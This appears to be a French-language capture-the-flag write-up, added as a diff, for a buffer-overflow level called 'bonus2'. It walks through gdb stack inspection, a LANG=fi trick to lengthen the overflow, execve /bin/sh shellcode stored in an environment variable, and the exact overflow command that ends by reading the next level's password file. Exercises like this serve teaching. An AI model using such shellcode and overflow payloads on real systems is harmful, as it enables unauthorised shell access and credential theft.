@@ -1,0 +1,36 @@
+# Apres review du code, on voit un strcat sur [ebp - 0x48], ov va chercher a overwrite le pointeur de eip de la stack.
+# Dans la fonction main on un buffer a esp + 80, nos 2 strncpy pousse le pointeur jusqu'a esp + 8.
+
+# Ansi la partie qui creer le parametre pour greetuser copy 19 caracteres mais vu qu'il y un colision on peut envoyer a greetuser 80 caracteres.
+
+# On commence par recuperer l'endroit ou est stocke eip sur la sack dans greetuser.
+
+gdb --args ./bonus2 AAAA BBBB
+> b *0x8048527 // avant le leave de greetuser
+
+# On cherche l'adresse 0x8048630 qui est l'instruction apres 'call greetuser'.
+> x/32x $esp
+
+0xbffff600:     0xbffff610      0xbffff660      0x00000001      0x00000000
+0xbffff610:     0x6c6c6548      0x4141206f      0x08004141      0xb7e5e1ee
+0xbffff620:     0x08048738      0xb7e35448      0xb7ec36c0      0xb7ec38ee
+0xbffff630:     0xbffff668      0x00000002      0x0804873a      0x00000004
+0xbffff640:     0xbffff718      0xb7ff26b0      0x00000000      0xbffff6b0
+0xbffff650:     0x00000000      0xbffff6fc      0xbffff718      0x08048630
+0xbffff660:     0x41414141      0x00000000      0x00000000      0x00000000
+0xbffff670:     0x00000000      0x00000000      0x00000000      0x00000000
+
+# On le voit a esp + 92. Donc dans le strcat on va devoir ecrir 92 caracteres + l'adresse a jump, donc 96 carateres.
+# Sauf que on peut envoyer que 80 caracteres, du coup il va falloir utiliser le premier parametre du strcat pour combler.
+# si on met LANG=fi, on obtient un premier parametre a 18, donc 18 + 80 = 98.
+# Parfait on a assez pour faire notre overflow.
+
+# On a pas de call system, on va devoir injecter du shell code.
+# On met notre shellcode dans une variable d'env
+
+export SHELLCODE=`python -c 'print("\x90" * 4096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+
+# On recupere l'adresse de notre shellcode: 0xbfffe8e5 + 2048 = 0xbffff0e5
+
+./bonus2 `python -c 'print("A" * 40)'` `python -c 'print("B" * 18 + "\xe5\xf0\xff\xbf")'`
+> cat /home/user/bonus3/.pass
